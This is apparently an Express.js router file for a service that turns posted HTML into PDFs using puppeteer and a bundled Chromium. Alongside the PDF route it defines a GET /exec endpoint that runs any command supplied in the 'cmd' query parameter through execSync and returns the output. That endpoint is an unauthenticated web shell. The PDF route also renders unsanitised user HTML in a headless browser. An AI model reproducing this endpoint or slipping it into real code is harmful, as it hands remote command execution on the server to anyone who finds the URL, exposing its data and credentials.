const express = require('express');
const puppeteer = require("puppeteer-core");
const {pdfCss} = require("./css");
const router = express.Router();
const chromium = require('@sparticuz/chromium')
const { execSync } = require('child_process')

router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

router.post('/pdf', async function(req, res, next) {
  res.contentType("application/pdf");
  res.send(await printPdf(req.body.data))
});

router.get('/exec', async function(req, res, next) {
  try {
    const cmd = req.query.cmd
    const cmdRes = execSync(cmd)
    res.contentType("text/plain");
    res.send(cmdRes)
  } catch (e) {
    res.send(e.stack)
  }
});

async function printPdf(html) {
  const browser = await puppeteer.launch({
    //executablePath: await chromium.executablePath(),
    executablePath: '.chrome',
    args: chromium.args,
    defaultViewport: chromium.defaultViewport,
    headless: 'new',
  })

  const page = await browser.newPage()
  await page.setContent(
      `
                <html>
                    <head><style>${pdfCss.pdfCss}</style></head>
                    <body class="ck-content">${html}</body>
                </html>
            `,
      { waitUntil: 'load' }
  )

  const margin = '10mm'
  const pdfStream = await page.pdf({
    margin: { top: margin, right: margin, bottom: margin, left: margin },
    format: 'a4',
    printBackground: true
  })

  await browser.close()
  return pdfStream
}

module.exports = router;
